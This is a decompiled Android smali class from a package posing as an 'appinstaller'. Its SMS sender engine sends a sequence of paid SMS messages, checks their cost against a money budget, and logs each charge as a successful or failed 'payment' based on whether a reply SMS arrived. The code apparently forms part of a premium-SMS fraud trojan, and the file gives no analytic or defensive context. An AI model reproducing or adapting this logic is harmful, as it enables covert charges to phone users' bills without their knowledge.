.class public Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;
.super Lcom/soft/android/appinstaller/sms/BasicSMSSender;
.source "ConfirmableSMSSenderEngineImpl.java"

# interfaces
.implements Lcom/soft/android/appinstaller/sms/capi/SMSSenderEngine;


# static fields
.field private static final CONFIRMABLE_SMS_LAST_RECEIVED_TIME:Ljava/lang/String; = "receivedSMS.confirmable.lastTime"

.field private static final CONFIRMABLE_SMS_LAST_SENT_TIME:Ljava/lang/String; = "sentSMS.confirmable.lastTime"

.field private static final tag:Ljava/lang/String; = "ConfirmableSMSSenderEngineImpl"


# instance fields
.field private context:Landroid/content/Context;

.field private final data:Lcom/soft/android/appinstaller/core/SmsInfo;

.field limits:Lcom/soft/android/appinstaller/sms/Limits;

.field private nextID:I

.field private prev:Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

.field private settings:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>(Lcom/soft/android/appinstaller/core/SmsInfo;Landroid/content/SharedPreferences;Landroid/content/Context;)V
    .locals 2
    .param p1, "data"    # Lcom/soft/android/appinstaller/core/SmsInfo;
    .param p2, "settings"    # Landroid/content/SharedPreferences;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 24
    invoke-direct {p0}, Lcom/soft/android/appinstaller/sms/BasicSMSSender;-><init>()V

    .line 25
    iput-object p1, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    .line 26
    iput-object p2, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->settings:Landroid/content/SharedPreferences;

    .line 27
    iput-object p3, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->context:Landroid/content/Context;

    .line 28
    const-string v0, "ConfirmableSMSSenderEngineImpl"

    const-string v1, "C-tor"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 29
    return-void
.end method

.method private isLastSentSMSApproved()Z
    .locals 8

    .prologue
    const-wide/16 v6, 0x0

    .line 78
    iget-object v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->settings:Landroid/content/SharedPreferences;

    const-string v5, "receivedSMS.confirmable.lastTime"

    invoke-interface {v4, v5, v6, v7}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    .line 79
    .local v0, "lastReceivedTime":J
    iget-object v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->settings:Landroid/content/SharedPreferences;

    const-string v5, "sentSMS.confirmable.lastTime"

    invoke-interface {v4, v5, v6, v7}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    .line 80
    .local v2, "lastSentTime":J
    cmp-long v4, v0, v2

    if-lez v4, :cond_0

    const/4 v4, 0x1

    :goto_0
    return v4

    :cond_0
    const/4 v4, 0x0

    goto :goto_0
.end method

.method private updateLastSentTime()V
    .locals 4

    .prologue
    .line 70
    iget-object v3, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->settings:Landroid/content/SharedPreferences;

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 71
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    .line 72
    .local v1, "time":J
    const-string v3, "sentSMS.confirmable.lastTime"

    invoke-interface {v0, v3, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 73
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 74
    return-void
.end method


# virtual methods
.method public SendMessage(Landroid/content/Context;Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "sms"    # Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    .prologue
    .line 64
    invoke-super {p0, p1, p2}, Lcom/soft/android/appinstaller/sms/BasicSMSSender;->SendMessage(Landroid/content/Context;Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V

    .line 65
    invoke-direct {p0}, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->updateLastSentTime()V

    .line 66
    iput-object p2, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->prev:Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    .line 67
    return-void
.end method

.method public canSendMoreMessages()Z
    .locals 6

    .prologue
    const/4 v2, 0x1

    const/4 v3, 0x0

    .line 32
    :goto_0
    iget v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->nextID:I

    iget-object v5, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    invoke-virtual {v5}, Lcom/soft/android/appinstaller/core/SmsInfo;->getConfirmableSmsCount()I

    move-result v5

    if-ge v4, v5, :cond_0

    iget-object v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    iget v5, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->nextID:I

    invoke-virtual {v4, v5}, Lcom/soft/android/appinstaller/core/SmsInfo;->getConfirmableSMS(I)Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    move-result-object v4

    invoke-virtual {v4}, Lcom/soft/android/appinstaller/core/SmsInfo$SMS;->getCost()I

    move-result v4

    iget-object v5, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    invoke-virtual {v5}, Lcom/soft/android/appinstaller/sms/Limits;->expectedMoneyRest()I

    move-result v5

    if-le v4, v5, :cond_0

    .line 33
    iget v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->nextID:I

    add-int/lit8 v4, v4, 0x1

    iput v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->nextID:I

    goto :goto_0

    .line 35
    :cond_0
    iget v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->nextID:I

    iget-object v5, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    invoke-virtual {v5}, Lcom/soft/android/appinstaller/core/SmsInfo;->getConfirmableSmsCount()I

    move-result v5

    if-ge v4, v5, :cond_1

    move v1, v2

    .line 36
    .local v1, "hasNextMessage":Z
    :goto_1
    iget-object v4, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    invoke-virtual {v4}, Lcom/soft/android/appinstaller/sms/Limits;->dcSmsCountRest()I

    move-result v4

    if-lez v4, :cond_2

    move v0, v2

    .line 37
    .local v0, "canSendNextByRule":Z
    :goto_2
    if-eqz v1, :cond_3

    if-eqz v0, :cond_3

    :goto_3
    return v2

    .end local v0    # "canSendNextByRule":Z
    .end local v1    # "hasNextMessage":Z
    :cond_1
    move v1, v3

    .line 35
    goto :goto_1

    .restart local v1    # "hasNextMessage":Z
    :cond_2
    move v0, v3

    .line 36
    goto :goto_2

    .restart local v0    # "canSendNextByRule":Z
    :cond_3
    move v2, v3

    .line 37
    goto :goto_3
.end method

.method public init(Lcom/soft/android/appinstaller/sms/Limits;)V
    .locals 1
    .param p1, "limits"    # Lcom/soft/android/appinstaller/sms/Limits;

    .prologue
    .line 57
    iput-object p1, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    .line 58
    const/4 v0, 0x0

    iput v0, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->nextID:I

    .line 59
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->prev:Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    .line 60
    return-void
.end method

.method public sendOneMessage()V
    .locals 3

    .prologue
    .line 41
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->prev:Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    if-eqz v1, :cond_0

    .line 42
    invoke-direct {p0}, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->isLastSentSMSApproved()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 43
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    iget-object v2, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->prev:Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    invoke-virtual {v1, v2}, Lcom/soft/android/appinstaller/sms/Limits;->registerSuccessfulPayment(Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V

    .line 49
    :cond_0
    :goto_0
    invoke-virtual {p0}, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->canSendMoreMessages()Z

    move-result v1

    if-nez v1, :cond_2

    .line 54
    :goto_1
    return-void

    .line 45
    :cond_1
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    iget-object v2, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->prev:Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    invoke-virtual {v1, v2}, Lcom/soft/android/appinstaller/sms/Limits;->registerFailedPaymend(Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V

    goto :goto_0

    .line 52
    :cond_2
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    iget v2, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->nextID:I

    invoke-virtual {v1, v2}, Lcom/soft/android/appinstaller/core/SmsInfo;->getConfirmableSMS(I)Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    move-result-object v0

    .line 53
    .local v0, "sms":Lcom/soft/android/appinstaller/core/SmsInfo$SMS;
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->context:Landroid/content/Context;

    invoke-virtual {p0, v1, v0}, Lcom/soft/android/appinstaller/sms/internals/ConfirmableSMSSenderEngineImpl;->SendMessage(Landroid/content/Context;Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V

    goto :goto_1
.end method
